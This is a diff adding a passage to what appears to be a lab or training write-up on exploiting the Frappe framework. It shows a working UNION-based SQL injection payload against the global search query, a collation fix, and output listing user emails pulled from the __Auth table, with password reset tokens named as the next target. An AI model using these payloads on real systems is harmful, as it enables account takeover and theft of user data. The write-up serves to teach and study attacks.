@@ -167,3 +167,26 @@ frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUse
   4980 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
 ```
 This confirms that password reset tokens are stored in the `tabUser` table, which becomes the next target for exploitation.
+To extract user emails, we target the name column in the __Auth table. A basic query would be: `SELECT name FROM __Auth;`
+To use this in a UNION-based SQL injection, we replace one of the placeholder values with `name` and append `FROM __Auth` to the query.
+```sql
+SELECT `doctype`, `name`, `content`, `title`, `route`
+  FROM `__global_search`
+  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
+  LIMIT 20 OFFSET 0
+```
+This is where we run into our first error. Frappe responds with the error `"Illegal mix of collations for operation 'UNION'"`.
+To avoid collation errors in the `UNION` query, we must first identify the collation of the `name` column in the `__global_search` table. This can be done with:
+```sql
+SELECT COLLATION_NAME 
+FROM information_schema.columns 
+WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
+```
+The request reveals that the `name` column in `__global_search` uses the `utf8mb4_general_ci` collation. With this, we update our injection payload to avoid collation errors:
+```sql
+SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
+```
+This returns the response:
+```json
+{"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
+```
